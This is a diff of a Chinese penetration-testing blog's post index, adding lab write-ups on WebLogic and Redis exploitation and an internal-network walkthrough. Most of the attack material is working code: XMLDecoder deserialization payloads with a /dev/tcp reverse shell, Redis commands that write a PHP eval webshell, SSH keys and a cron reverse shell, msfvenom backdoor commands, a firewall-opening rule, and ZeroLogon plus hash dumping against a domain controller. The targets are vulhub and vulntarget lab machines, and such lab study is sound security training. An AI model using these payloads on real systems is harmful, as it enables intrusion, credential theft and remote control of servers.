@@ -46,6 +46,217 @@
 ]]></content>
   </entry>
   <entry>
+    <title>[中间件漏洞复现]Weblogic漏洞</title>
+    <url>/2022/11/08/weblogic/</url>
+    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p><strong>Weblogic是基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。常用端口为7001。</strong></p>
+<h1 id="0x01-弱口令"><a href="#0x01-弱口令" class="headerlink" title="0x01 弱口令"></a>0x01 弱口令</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>进入vulhub的目录下weak_password并开启</p>
+<p><img src="https://s2.loli.net/2022/11/08/KcRmQUkxBvi7EXI.png" alt="image.png"></p>
+<p>建站开始的账号密码为weblogic&#x2F;Oracle@123，登陆后台</p>
+<p>选择部署，然后安装</p>
+<p><img src="https://s2.loli.net/2022/11/08/lwVHDzUiMREZvrI.png" alt="image.png"></p>
+<p>选择上传文件</p>
+<p><img src="https://s2.loli.net/2022/11/08/NnfOWbHTRl24mud.png" alt="image.png"></p>
+<p>在此先准备jar</p>
+<p>执行jar -cvf c.war shell.jsp生成c.war，并上传war包</p>
+<p><img src="https://s2.loli.net/2022/11/08/UJb13ikzOI2aWVs.png" alt="image.png"></p>
+<p>一直Next到此步骤即可</p>
+<p><img src="https://s2.loli.net/2022/11/08/rY9uN8tvqmge7bA.png" alt="image.png"></p>
+<p>冰蝎连接</p>
+<p><img src="https://s2.loli.net/2022/11/08/TDWj1n2KOumozE5.png" alt="image.png"></p>
+<h1 id="0x02-CVE-2017-3506"><a href="#0x02-CVE-2017-3506" class="headerlink" title="0x02 CVE-2017-3506"></a>0x02 CVE-2017-3506</h1><h2 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>构造SOAP（XML）格式的请求，在解析的过程中导致XMLDecoder反序列化漏洞</p>
+<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>该漏洞版本为10.3.6.0, 12.1.3.0, 12.2.1.0, 12.2.1.1 and 12.2.1.2。</p>
+<p>在浏览器中访问<a href="http://xx.xx.xx.xx:7001/wls-wsat/CoordinatorPortType">http://xx.xx.xx.xx:7001/wls-wsat/CoordinatorPortType</a></p>
+<p><img src="https://s2.loli.net/2022/11/08/IR7YDpVie3lsU5P.png" alt="image.png"></p>
+<p>对该页面进行burp抓包放到repeater中</p>
+<p><img src="https://s2.loli.net/2022/11/08/GqkCHRPEwIM8Wgx.png" alt="image.png"></p>
+<p><strong>重新构造数据包</strong></p>
+<p>更换请求方式为post，修改Content-Type为text&#x2F;xml，并贴入以下内容作为POST的data部分。这个PoC等同于命令：&#x2F;bin&#x2F;bash -c “touch &#x2F;tmp&#x2F;123”</p>
+<pre><code>&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;  
+  &lt;soapenv:Header&gt;  
+    &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;  
+        &lt;java version=&quot;1.8.0_131&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;  
+          &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;  
+            &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;  
+              &lt;void index=&quot;0&quot;&gt;  
+                &lt;string&gt;/bin/bash&lt;/string&gt;  
+             &lt;/void&gt;  
+              &lt;void index=&quot;1&quot;&gt;  
+                &lt;string&gt;-c&lt;/string&gt;  
+             &lt;/void&gt;  
+             &lt;void index=&quot;2&quot;&gt;  
+                &lt;string&gt;touch /tmp/123&lt;/string&gt;  
+             &lt;/void&gt;  
+            &lt;/array&gt;  
+          &lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;  
+        &lt;/java&gt;  
+      &lt;/work:WorkContext&gt;  
+    &lt;/soapenv:Header&gt;  
+  &lt;soapenv:Body/&gt;  
+&lt;/soapenv:Envelope&gt;
+</code></pre>
+<p><img src="https://s2.loli.net/2022/11/08/amdCHFeY3ygTIGl.png" alt="image.png"></p>
+<h1 id="0x03-CVE-2017-10271"><a href="#0x03-CVE-2017-10271" class="headerlink" title="0x03 CVE-2017-10271"></a><strong>0x03 CVE-2017-10271</strong></h1><h2 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>WebLogic对POST类型的XML请求未做有效的过滤防范，导致了XMLDecoder反序列化漏洞</p>
+<h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问 <a href="http://xx.xx.xx.xx:7001/wls-wsat/CoordinatorPortType11%EF%BC%8C%E5%9B%9E%E6%98%BE%E5%88%99%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E">http://xx.xx.xx.xx:7001/wls-wsat/CoordinatorPortType11，回显则存在漏洞</a></p>
+<p><img src="https://s2.loli.net/2022/11/08/q4jKisubFAIBDcX.png" alt="image.png"></p>
+<p>更换请求方式为post，修改Content-Type为text&#x2F;xml，并贴入以下内容作为POST的data部分。写入test.txt</p>
+<pre><code>POST /wls-wsat/CoordinatorPortType11 HTTP/1.1  
+Host: 192.168.50.173:7001  
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0  
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8  
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
+Accept-Encoding: gzip, deflate  
+DNT: 1  
+Connection: close  
+Content-Type: text/xml  
+Upgrade-Insecure-Requests: 1  
+ 
+&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;  
+     &lt;soapenv:Header&gt;  
+        &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;  
+         &lt;java version=&quot;1.6.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;  
+                    &lt;object class=&quot;java.io.PrintWriter&quot;&gt;   
+                       &lt;string&gt;servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/test.txt&lt;/string&gt;&lt;void method=&quot;println&quot;&gt;  
+                        &lt;string&gt;xmldecoder_vul_test&lt;/string&gt;&lt;/void&gt;&lt;void method=&quot;close&quot;/&gt;  
+                    &lt;/object&gt;  
+            &lt;/java&gt;  
+        &lt;/work:WorkContext&gt;  
+      &lt;/soapenv:Header&gt;  
+      &lt;soapenv:Body/&gt;  
+&lt;/soapenv:Envelope&gt;
+</code></pre>
+<p>访问<a href="http://192.168.50.173:7001/wls-wsat/test.txt">http://192.168.50.173:7001/wls-wsat/test.txt</a></p>
+<p><img src="https://s2.loli.net/2022/11/08/eFHTosAQWNLaxP1.png" alt="image.png"></p>
+<h1 id="0x04-CVE-2019-2725"><a href="#0x04-CVE-2019-2725" class="headerlink" title="0x04 CVE-2019-2725"></a><strong>0x04 CVE-2019-2725</strong></h1><h2 id="漏洞原理-3"><a href="#漏洞原理-3" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><strong>wls-ws反序列化漏洞(CVE-2019-2725)。攻击者可以发送有意构造的恶意HTTP请求，在未授权的情况下执行远程命令。</strong></p>
+<p><strong>漏洞触发点：bea_wls9_async_response.war、wsat.war</strong></p>
+<p><strong>影响版本：Oracle WebLogic Server 10.* 、Oracle WebLogic Server 12.1.3</strong></p>
+<h2 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<a href="http://xx.xx.xx.xx:7001/async/AsyncResponseService%EF%BC%8C%E5%88%99%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E">http://xx.xx.xx.xx:7001/async/AsyncResponseService，则存在漏洞</a></p>
+<p><img src="https://s2.loli.net/2022/11/08/OiE925pkAXlR17g.png" alt="image.png"></p>
+<p>POC如下</p>
+<pre><code>&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot;
+xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;
+&lt;soapenv:Header&gt;
+&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;
+&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;
+&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
+&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;
+&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;
+&lt;void index=&quot;0&quot;&gt;
+&lt;string&gt;/bin/bash&lt;/string&gt;
+&lt;/void&gt;
+&lt;void index=&quot;1&quot;&gt;
+&lt;string&gt;-c&lt;/string&gt;
+&lt;/void&gt;
+&lt;void index=&quot;2&quot;&gt;
+&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.50.239/5555 0&amp;gt;&amp;amp;1&lt;/string&gt;
+&lt;/void&gt;
+&lt;/array&gt;
+&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;
+&lt;/work:WorkContext&gt;
+&lt;/soapenv:Header&gt;
+&lt;soapenv:Body&gt;
+&lt;asy:onAsyncDelivery/&gt;
+&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;
+</code></pre>
+<p><img src="https://s2.loli.net/2022/11/08/BkLmJMs9CARpEX8.png" alt="image.png"></p>
+<p>POC适用于Linux系统，Window版本可以使用Java反序列化工具上传shell</p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[中间件漏洞复现]Redis漏洞</title>
+    <url>/2022/11/08/Redis/</url>
+    <content><![CDATA[<h1 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 基础"></a>0x00 基础</h1><p>Redis是一个开源的、使用C语言编写的、支持网络交互的、可基于内存也可持久化的Key-Value数据库。默认端口为6379</p>
+<p>在Centos7上安装</p>
+<pre><code>wget http://download.redis.io/releases/redis-6.0.8.tar.gz
+tar xzf redis-6.0.8.tar.gz
+cd redis-6.0.8
+make
+cd src  切换到src
+cp redis-cli /usr/bins
+cp redis-server /usr/bin
+</code></pre>
+<p>渗透环境</p>
+<pre><code>KAli  redis客户端攻击IP：192.168.50.246
+Centos redis服务端IP:192.168.50.186
+</code></pre>
+<p>有关Redis主从复制的文章</p>
+<p><a href="https://blog.csdn.net/Cantevenl/article/details/115839649">https://blog.csdn.net/Cantevenl/article/details/115839649</a></p>
+<h1 id="0x01-漏洞"><a href="#0x01-漏洞" class="headerlink" title="0x01 漏洞"></a>0x01 漏洞</h1><h2 id="1-未授权访问"><a href="#1-未授权访问" class="headerlink" title="1.未授权访问"></a>1.未授权访问</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>Redis默认情况，会绑定0.0.0.0:6379。如果没有采用相关的策略，如配置防火墙规则避免其他非信任来源的IP访问，就会将Redis服务暴露在公网；没有设置密码认证，会导致任意用户可以访问目标服务器下未授权访问Redis以及读取Redis数据。</p>
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>在Centos7编辑Redis配置文件redis.conf，加上#，去掉IP绑定，允许除本地外的主机登录Redis服务</p>
+<p><img src="https://s2.loli.net/2022/11/08/hZBIirR2WS6pkXT.png" alt="image.png"></p>
+<p>修改protected-mode为no，关闭保护模式，允许远程连接Redis服务</p>
+<p>在Centos7开启服务端 </p>
+<pre><code>redis-server redis.conf
+</code></pre>
+<p>在Kali上使用客户端连接</p>
+<p><img src="https://s2.loli.net/2022/11/08/EIpOLfbglvd2AR4.png" alt="image.png"></p>
+<h2 id="2-写入Webshell"><a href="#2-写入Webshell" class="headerlink" title="2.写入Webshell"></a>2.写入Webshell</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>靶机的Redis存在<strong>未授权访问</strong>，前提如下：</p>
+<pre><code>1.开启Web服务
+2.Web目录路径
+3.文件具有读写增删改查的权限
+</code></pre>
+<h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p>写入Webshell</p>
+<pre><code>192.168.50.186:6379&gt; config set dir /var/www/html
+OK
+192.168.50.186:6379&gt; config set dbfilename l5.php
+OK
+192.168.50.186:6379&gt; set webshell &quot;&lt;?php @eval($_POST[1]);?&gt;&quot;
+OK
+192.168.50.186:6379&gt; save
+</code></pre>
+<p>写入一句话</p>
+<p><img src="https://s2.loli.net/2022/11/08/y1Xc9usjONren3Q.png" alt="image.png"></p>
+<p>用蚁剑连接</p>
+<p><img src="https://s2.loli.net/2022/11/08/M4DKxnEkPovf6ep.png" alt="image.png"></p>
+<h2 id="3-密钥登录SSH"><a href="#3-密钥登录SSH" class="headerlink" title="3.密钥登录SSH"></a>3.密钥登录SSH</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>在数据库插入一条数据，将本机的公钥作为Value，key值随意，修改数据库的默认路径为&#x2F;root&#x2F;.ssh和默认的缓冲文件authorized.keys,在服务器端的&#x2F;root&#x2F;.ssh下生成一个授权的key</p>
+<h3 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h3><p>利用条件</p>
+<pre><code>1.Redis和ssh对外开放
+2.未授权状态
+3.可以通过key登录
+</code></pre>
+<p>Kali创建ssh-rsa密钥</p>
+<p><img src="https://s2.loli.net/2022/11/08/ehMkn2Y3rF8qzS7.png" alt="image.png"></p>
+<p>将公钥导入key.txt并写入</p>
+<pre><code>(echo -e &quot;\n\n&quot;;cat id_rsa.pub;echo -e &quot;\n\n&quot;) &gt; key.txt
+</code></pre>
+<p><img src="https://s2.loli.net/2022/11/08/CYcf9MH5K8IGpTb.png" alt="image.png"></p>
+<p>设置路径和保存的文件，将内存变量导入磁盘文件</p>
+<pre><code>config set dir /root/.ssh
+config set dbfilename authorized_keys
+save
+</code></pre>
+<p><img src="https://s2.loli.net/2022/11/08/TZfnq9RH13t7dhs.png" alt="image.png"></p>
+<p>Kali用ssh连接靶机</p>
+<p><img src="https://s2.loli.net/2022/11/08/dxBR3UnipGtDZ2J.png" alt="image.png"></p>
+<h2 id="4-crontab反弹shell"><a href="#4-crontab反弹shell" class="headerlink" title="4.crontab反弹shell"></a>4.crontab反弹shell</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><h3 id="复现-3"><a href="#复现-3" class="headerlink" title="复现"></a>复现</h3><pre><code>192.168.50.186:6379&gt; set xx &quot;\n*****bash -i &gt;&amp; /dev/tcp/192.168.50.186/9999 0&gt;&amp;1\n&quot;
+192.168.50.186:6379&gt; config set dir /var/spool/cron
+192.168.50.186:6379&gt; config set dbfilename root
+192.168.50.186:6379&gt; save
+</code></pre>
+<p>并在kali上监听9999（不过后续没有完成）</p>
+<h2 id="5-远程主从复制RCE"><a href="#5-远程主从复制RCE" class="headerlink" title="5.远程主从复制RCE"></a>5.远程主从复制RCE</h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式</p>
+<p><strong>影响范围：</strong></p>
+<p>在Redis的4.X和5.X版本皆可使用</p>
+<h3 id="复现-4"><a href="#复现-4" class="headerlink" title="复现"></a>复现</h3><p>下载Redis-rogue-server</p>
+<p><img src="https://s2.loli.net/2022/11/08/slbRaXKnECjf8yt.png" alt="image.png"></p>
+<p>运行脚本后i为交互式shell,r为反弹shell</p>
+<p><img src="https://s2.loli.net/2022/11/08/EDdzUp2axQLZMJh.png" alt="image.png"></p>
+<p>反弹shell如下，根据提示输入Ip，与监听的端口</p>
+<p><img src="https://s2.loli.net/2022/11/08/QRfkrPaAbNuVpnF.png" alt="image.png"></p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>[代码审计]熊海cms v1.0整站审计</title>
     <url>/2022/11/08/xhcms/</url>
     <content><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>早上11点起来，准备把新手入门的熊海cms代审一遍，结果一点就得去练车了，到现在才写完，懒狗！</p>
@@ -184,22 +395,7 @@ $qq=$_POST[&#39;qq&#39;];
 
 开机密码Admin@666
 </code></pre>
-<p>记录</p>
-<pre><code>记录
-1.还处于拿win7状态，由于win2016的防火墙暂未拿下，对一些中转流量还不太了解（太次了）
-2.后续先尝试把2016的防火墙关闭，中转win7使用connect 10.0.20.99 1103 接受到由win2016传来的流量，上线成功，window2019也一样。
-3.另一种做法就是写bat到启动程序里，使用下载远程或远程shellcode上线
-
-
-https://www.bilibili.com/video/BV1VT4y1D7Lv/?spm_id_from=333.880.my_history.page.click&amp;vd_source=5ecc9ae5a4974a961d0c42340eeb39e6
-
-https://blog.csdn.net/weixin_48421613/article/details/123626822
-
-https://cloud.tencent.com/developer/article/1954759
-
-https://blog.csdn.net/weixin_42478365/article/details/119653
-</code></pre>
-<h1 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h1><p>扫描端口发现80、3389端口</p>
+<h1 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h1><h2 id="OA文件包含"><a href="#OA文件包含" class="headerlink" title="OA文件包含"></a>OA文件包含</h2><p>扫描端口发现80端口</p>
 <p><img src="https://s2.loli.net/2022/11/04/WlRN2qSwuMHyPTJ.png" alt="image.png"></p>
 <p>查看网站为OA系统</p>
 <p><img src="https://s2.loli.net/2022/11/04/luaVfbCq7S4p5TK.png" alt="image.png"></p>
@@ -207,23 +403,22 @@ https://blog.csdn.net/weixin_42478365/article/details/119653
 <p><img src="https://s2.loli.net/2022/11/04/sTUxDMRHP8ZnVLN.png" alt="image.png"></p>
 <p>蚁剑连接</p>
 <p><img src="https://s2.loli.net/2022/11/04/ElRdqpjciaBVTPx.png" alt="image.png"></p>
-<p>上线CS（MSF的代理有些问题，搞得心态有点崩）</p>
+<p>上线CS</p>
 <p><img src="https://s2.loli.net/2022/11/04/LC6UnaOqei4zrxu.png" alt="image.png"></p>
-<p>这里发现存在另一张网卡</p>
+<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="对Win2016进行Redis未授权"><a href="#对Win2016进行Redis未授权" class="headerlink" title="对Win2016进行Redis未授权"></a>对Win2016进行Redis未授权</h2><p>这里发现存在另一张网卡</p>
 <p><img src="https://s2.loli.net/2022/11/04/PTsyKbzx1hoYkGj.png" alt="image.png"></p>
 <p>获取Window7密码</p>
 <p><img src="https://s2.loli.net/2022/11/04/HGgVtBvhIr7yKL2.png" alt="image.png"></p>
-<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>使用proxychains4代理，访问redis的未授权</p>
+<p>使用proxychains4代理，访问redis的未授权</p>
 <p><img src="https://s2.loli.net/2022/11/04/K5woYLIgaUcz8MW.png" alt="image.png"></p>
 <p>这里有个槽点，就是VMWARE放两张仅主机网卡，原本设置IP为10的网卡却变成了20，为此这个细节花了整整一大半时间，我寻思这仅主机配的也没错呀，原来不是代理慢问题。。。</p>
-<p>查看win2016的arp，也发现20.99的IP存在。</p>
 <p>代理查找开放端口</p>
 <p><img src="https://s2.loli.net/2022/11/04/aZt36uwkOmLSipU.png" alt="image.png"></p>
 <p>存在网页，返回hello world</p>
 <p><img src="https://s2.loli.net/2022/11/04/aSUQ26fAueWhXGO.png" alt="image.png"></p>
 <p>对Redis进行未授权攻击</p>
 <p><img src="https://s2.loli.net/2022/11/04/gvZPzBLDKbqd8pR.png" alt="image.png"></p>
-<p>这里需要知道Web的目录路径才可以写入一句话（直接开启上帝视角）</p>
+<p>这里需要知道Web的目录路径才可以写入一句话</p>
 <p><img src="https://s2.loli.net/2022/11/04/sfiwtQPAzW5YoF1.png" alt="image.png"></p>
 <p>蚁剑挂代理</p>
 <p><img src="https://s2.loli.net/2022/11/04/3LU8JPxmc9hgG1j.png" alt="image.png"></p>
@@ -231,16 +426,64 @@ https://blog.csdn.net/weixin_42478365/article/details/119653
 <p><img src="https://s2.loli.net/2022/11/04/KN5XeAcypYP9UGS.png" alt="image.png"></p>
 <p>查看网卡，存在另一个网段，域vulntarget.com</p>
 <p><img src="https://s2.loli.net/2022/11/04/GANuCEWyM9n8qKS.png" alt="image.png"></p>
-<p>利用as-exploit查看是哪款杀软，Windows Defender</p>
-<p><img src="https://s2.loli.net/2022/11/04/oAfXnsZPWR1divN.png" alt="image.png"></p>
-<p>上线win2016需要重新建立一个正向监听</p>
-<p><img src="https://s2.loli.net/2022/11/04/o651URDNk3SYuFE.png" alt="image.png"></p>
-<p>生成1103木马</p>
-<p><img src="https://s2.loli.net/2022/11/04/yCSzdY4MBaXhc1U.png" alt="image.png"></p>
-<p>生成的beacon1.exe通过蚁剑上传至10.0.20.99(win2016)服务器，而后运行</p>
-<p><img src="https://s2.loli.net/2022/11/04/UHTQc1lBRrzI4Pk.png" alt="image.png"></p>
-<p>未被上线，使用as-exploit插件显示开启了window defender</p>
-<p>使用10.0.20.98机器进行监听</p>
+<h2 id="挂多层代理"><a href="#挂多层代理" class="headerlink" title="挂多层代理"></a>挂多层代理</h2><p>想Window2016，有多种方法</p>
+<ol>
+<li>通过上传小马到启动项里，然后用CS开启监听</li>
+<li>不出网监听</li>
+</ol>
+<blockquote>
+<p>CS二层代理过不去关，我用MSF做二层，正向和反向皆不行，是因为在kali这层并未做代理，让kali能与10.0.20.0&#x2F;24这个网段相互通，所以重新用MSF做一层代理再跳二层</p>
+</blockquote>
+<p>Msf反向连接win7，先生成后门</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.50.246 LPORT=1111 -f exe &gt; /home/f1.exe
+</code></pre>
+<p><img src="https://s2.loli.net/2022/11/10/7o9YKA3XfzLIchP.png" alt="image.png"></p>
+<p>查看子网网段</p>
+<p><img src="https://s2.loli.net/2022/11/10/7TCshbtDmrH3Yil.png" alt="image.png"></p>
+<p>添加路由</p>
+<p><img src="https://s2.loli.net/2022/11/10/zKHwFrkBPGRWaNT.png" alt="image.png"></p>
+<p>查看已添加的路由</p>
+<p><img src="https://s2.loli.net/2022/11/10/DAczkF4r7mhd5wB.png" alt="image.png"></p>
+<p>添加socks5代理</p>
+<p><img src="https://s2.loli.net/2022/11/10/v64PikxdAwZngrR.png" alt="image.png"></p>
+<p>修改proxychain.conf</p>
+<p><img src="https://s2.loli.net/2022/11/10/rTikDfs7CeR9gGW.png" alt="image.png"></p>
+<p>对10.0.20.99进行curl</p>
+<p><img src="https://s2.loli.net/2022/11/10/WtEjOI7bUxeudMs.png" alt="image.png"></p>
+<p>使用arp -a发现10.0.20.99</p>
+<p><img src="https://s2.loli.net/2022/11/10/mxBZGRaIkYFLSqJ.png" alt="image.png"></p>
+<p>配置蚁剑的代理服务器</p>
+<p><img src="https://s2.loli.net/2022/11/10/TS5pKzHXeq9FrJB.png" alt="image.png"></p>
+<p>按照上面的Redis未授权写进shell，小马连接</p>
+<p>正向连接生成木马</p>
+<pre><code>msfvenom -p windows/x64/meterpreter/bind_tcp  LPORT=8090 -f exe &gt; 8090_bind.exe
+</code></pre>
+<p>设置规则</p>
+<pre><code>netsh advfirewall firewall add rule name=&quot;bind tcp&quot; protocol=TCP dir=in localport=8090 action=allow
+</code></pre>
+<p><img src="https://s2.loli.net/2022/11/10/3iIjopxcrqJ71AR.png" alt="image.png"></p>
+<p>发现存在10.0.10.0&#x2F;24网段</p>
+<p><img src="https://s2.loli.net/2022/11/10/27mUQPWEToNflYg.png" alt="image.png"></p>
+<p>查看主机路由</p>
+<p><img src="https://s2.loli.net/2022/11/10/enPsiVp1Q5h2G8x.png" alt="image.png"></p>
+<p>添加到10.0.10.0&#x2F;24的路由</p>
+<p><img src="https://s2.loli.net/2022/11/10/UKCc1SFODuEjbqB.png" alt="image.png"></p>
+<p>查看域管理员为administrator</p>
+<p><img src="https://s2.loli.net/2022/11/10/s6cAtRUNOzefi7F.png" alt="image.png"></p>
+<p>查看域控制器计算机为Win2019$</p>
+<p><img src="https://s2.loli.net/2022/11/10/MT3AOX8BKLqkfPw.png" alt="image.png"></p>
+<h2 id="CVE-2020-1472提权到域控"><a href="#CVE-2020-1472提权到域控" class="headerlink" title="CVE-2020-1472提权到域控"></a>CVE-2020-1472提权到域控</h2><p>使用漏洞将密码制空，EXP地址<a href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a></p>
+<p>还得添加路由和迁移进程</p>
+<p><img src="https://s2.loli.net/2022/11/10/Q5EzJOWBmSUPRTf.png" alt="image.png"></p>
+<p><img src="https://s2.loli.net/2022/11/10/2Gj95JbfOCh1ydF.png" alt="image.png"></p>
+<p>再使用<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py%EF%BC%8C%E5%B0%86hash%E5%80%BCdump%E5%87%BA%E6%9D%A5">https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py，将hash值dump出来</a></p>
+<p><img src="https://s2.loli.net/2022/11/10/osaVgeH32F7TOcQ.png" alt="image.png"></p>
+<p>拿join工具获得Window2019开机密码为Admin@666</p>
+<p>使用smbexec拿到域控的shell</p>
+<p><img src="https://s2.loli.net/2022/11/10/IGmeZan2zFhV7qk.png" alt="image.png"></p>
+<p>跟上面一样，把小马发给wind2016上，防火墙设置允许端口入站</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://cloud.tencent.com/developer/article/1954759">https://cloud.tencent.com/developer/article/1954759</a></p>
+<p><a href="https://blog.csdn.net/weixin_48421613/article/details/123626822">https://blog.csdn.net/weixin_48421613/article/details/123626822</a></p>
 ]]></content>
       <categories>
         <category>渗透测试</category>
@@ -250,7 +493,7 @@ https://blog.csdn.net/weixin_42478365/article/details/119653
       </tags>
   </entry>
   <entry>
-    <title>信息收集</title>
+    <title>[渗透测试]信息收集</title>
     <url>/2022/11/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
     <content><![CDATA[<h1 id="域名查询"><a href="#域名查询" class="headerlink" title="域名查询"></a><strong>域名查询</strong></h1><h2 id="Whois查询"><a href="#Whois查询" class="headerlink" title="Whois查询"></a><strong>Whois查询</strong></h2><p><strong>查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商、域名注册日期和过期日期等）</strong></p>
 <p><a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p>
@@ -425,9 +668,12 @@ https://www.sojson.com/zz/portscan.html
       <categories>
         <category>渗透测试</category>
       </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
   </entry>
   <entry>
-    <title>disable_function绕过</title>
+    <title>[总结]disable_function绕过</title>
     <url>/2022/11/02/disable_function%E7%BB%95%E8%BF%87/</url>
     <content><![CDATA[<h1 id="LD-PRELOAD环境变量"><a href="#LD-PRELOAD环境变量" class="headerlink" title="LD_PRELOAD环境变量"></a>LD_PRELOAD环境变量</h1><p>LD_PRELOAD是Linux系统的一个环境变量，允许在程序运行前优先加载动态链接库。可以通过环境变量LD_PRELOAD劫持系统函数，可以达到不调用 PHP 的各种命令执行函数（system()、exec() 等等）仍可执行系统命令的目的。</p>
 <p>利用条件</p>
